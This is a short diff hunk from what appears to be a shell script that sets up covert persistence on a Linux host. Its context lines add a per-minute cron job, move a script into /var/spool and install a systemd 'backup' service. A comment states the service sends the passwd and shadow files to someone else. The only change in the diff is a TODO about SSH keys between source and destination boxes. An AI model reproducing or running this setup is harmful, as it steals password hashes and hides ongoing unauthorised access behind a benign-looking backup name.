@@ -106,7 +106,7 @@ echo "* * * * * /var/www/log/ps_init.sh >> /var/log/cron/ps.log 2>&1" >> /var/sp
 
 # setup service that sends logging, passwd, and shadow file to someone else
 # TODO: setup dest box to receive files - use static ip UPDATE: not needed - I'll just keep the box on lol
-# TODO: setup rsa key on source and dest boxes UPDATE: done!
+# TODO: setup rsa key on source and dest boxes - ssk-keygen and ssh-copy-id -i
 chmod +x backup.sh
 mv backup.sh /var/spool
 mv backup.service /etc/systemd/system/
